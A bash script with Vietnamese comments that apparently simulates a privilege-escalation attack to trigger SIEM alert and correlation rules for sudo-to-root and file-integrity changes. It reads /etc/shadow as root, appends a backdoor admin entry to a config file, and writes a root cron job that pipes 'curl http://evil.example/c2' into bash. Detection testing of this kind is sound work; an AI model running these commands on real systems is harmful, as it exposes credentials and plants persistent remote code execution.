#!/bin/bash
# Leo thang quyen: dung tai khoan da chiem (ketoan1) -> sudo len root -> sua file cau hinh.
# Kich hoat chuoi rule tuong quan privilege_then_config_change:
#   5402/5403 (sudo to root)  ->  syscheck (FIM doi file /etc/erpapp)
set -u
TARGET="${1:-fs01}"
USER="${2:-ketoan1}"
PASS="${3:-Ketoan@123}"

SSH="sshpass -p $PASS ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no $USER@$TARGET"

echo "===== [1/3] Dang nhap bang tai khoan da chiem: $USER@$TARGET ====="
$SSH 'id' 2>&1 | tail -1

echo "===== [2/3] LEO THANG QUYEN: sudo len root ====="
# sudo -S doc mat khau tu stdin -> sinh log "sudo: ... COMMAND" -> rule 5402/5403
$SSH "echo $PASS | sudo -S id" 2>&1 | grep -E "uid=0|root" | tail -1
$SSH "echo $PASS | sudo -S cat /etc/shadow | head -2" 2>&1 | tail -2

# Cho vai giay truoc khi sua config. Alert sudo di qua auth.log -> agent -> manager,
# tre hon FIM realtime ~1s. Neu sua file ngay, timestamp FIM co the < timestamp sudo,
# lam rule tuong quan hieu nham "doi config truoc khi leo quyen" -> khong khop thu tu.
sleep 8

echo "===== [3/3] CAM CHOT: sua file cau hinh he thong (FIM bat) ====="
# Ghi de file trong thu muc FIM realtime -> syscheck alert (rule.groups: syscheck)
$SSH "echo $PASS | sudo -S bash -c 'echo backdoor_admin=attacker >> /etc/erpapp/config.conf; echo \"* * * * * root curl http://evil.example/c2 | bash\" > /etc/erpapp/cron.evil'" 2>&1 | tail -1
echo "===== xong. Kiem tra rule 5402/5403 + syscheck + tuong quan privilege_then_config_change ====="
